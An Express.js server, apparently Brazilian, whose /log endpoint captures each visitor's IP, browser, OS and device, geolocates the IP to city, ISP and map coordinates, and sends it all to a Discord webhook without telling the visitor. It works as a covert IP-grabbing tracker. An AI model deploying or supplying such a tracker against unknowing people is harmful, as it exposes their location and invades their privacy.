const express = require("express");
const axios = require("axios");
const UAParser = require("ua-parser-js");

const app = express();
const PORT = process.env.PORT || 3000;

app.set("trust proxy", true);

app.use(express.static("public"));

async function getLocation(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}`);

    return {
      city: res.data.city || "Desconhecido",
      country: res.data.country || "Desconhecido",
      isp: res.data.isp || "Desconhecido",
      lat: res.data.lat,
      lon: res.data.lon
    };

  } catch {

    return {
      city: "Desconhecido",
      country: "Desconhecido",
      isp: "Desconhecido",
      lat: null,
      lon: null
    };

  }
}

app.get("/log", async (req, res) => {

  const ip = req.ip;
  const ua = req.headers["user-agent"] || "Desconhecido";

  const parser = new UAParser(ua);

  const browser = parser.getBrowser().name || "Desconhecido";
  const os = parser.getOS().name || "Desconhecido";
  const device = parser.getDevice().type || "Desktop";

  const time = new Date().toLocaleString("pt-BR", {
    timeZone: "America/Sao_Paulo"
  });

  const location = await getLocation(ip);

  let mapsLink = "Indisponível";

  if (location.lat && location.lon) {
    mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
  }

  try {

    await axios.post(process.env.DISCORD_WEBHOOK, {

      username: "Access Logger",

      embeds: [
        {
          title: "📡 Nova visita detectada",
          color: 3447003,

          fields: [
            {
              name: "🌐 IP",
              value: ip,
              inline: false
            },
            {
              name: "📍 Localização",
              value: `${location.city}, ${location.country}`,
              inline: false
            },
            {
              name: "🗺 Google Maps",
              value: mapsLink,
              inline: false
            },
            {
              name: "🏢 Provedor",
              value: location.isp,
              inline: false
            },
            {
              name: "💻 Dispositivo",
              value: device,
              inline: true
            },
            {
              name: "🖥 Sistema",
              value: os,
              inline: true
            },
            {
              name: "🌎 Navegador",
              value: browser,
              inline: true
            },
            {
              name: "🕒 Horário",
              value: time,
              inline: false
            }
          ],

          footer: {
            text: "Railway • Express Logger"
          }
        }
      ]
    });

  } catch (err) {

    console.error("Erro ao enviar webhook:", err.message);

  }

  res.sendStatus(204);

});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
